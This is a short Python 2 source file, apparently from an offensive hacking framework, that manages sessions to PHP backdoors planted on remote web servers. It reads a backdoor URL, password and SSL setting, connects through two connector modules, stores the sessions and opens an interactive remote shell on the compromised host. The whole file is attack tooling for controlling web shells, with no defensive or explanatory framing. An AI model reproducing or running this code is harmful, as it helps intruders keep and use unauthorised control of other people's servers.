import shandler
import sys, os
import importlib

# Add your handler to this list
sys.path.append(os.path.dirname(__file__) + "/phpc")
sys.path.append(os.path.dirname(__file__) + "/sphp")

import php_connect
import sphp_connect

sessions = []

def handle(handler):
    try:
        if(handler["cfg_path"] == "/phpc"):
            url = handler["Options"]["columns"][handler["DB_options"]["BackdoorURL"]["i"]]
            password = handler["Options"]["columns"][handler["DB_options"]["Password"]["i"]]
            ssl = handler["Options"]["columns"][handler["DB_options"]["SSL"]["i"]]
            if(url == ""):
                print "[-] Failed to run handler / no URL specified."
            else:
                session = php_connect.PHPOConnector(url, ssl, password)
                if(session.connect()):
                    sessions.append(session)
                    print "[!] Session added."
                else:
                    print "[!] No new sessions."
        elif(handler["cfg_path"] == "/sphp"):
            url = handler["Options"]["columns"][handler["DB_options"]["BackdoorURL"]["i"]]
            ssl = handler["Options"]["columns"][handler["DB_options"]["SSL"]["i"]]
            if(url == ""):
                print "[-] Failed to run handler / no URL specified."
            else:
                session = sphp_connect.PHPSConnector(url, ssl)
                if(session.connect()):
                    sessions.append(session)
                    print "[!] Session added."
                else:
                    print "[!] No new sessions."
    except Exception as e:
        print "Failed to execute handlero.handle() : "+str(e)
def interact(session_id):
    try:
        sessions[int(session_id)].raiseShell(session_id)
    except Exception as e:
        print "Failed to execute handlero.interact() : "+str(e)
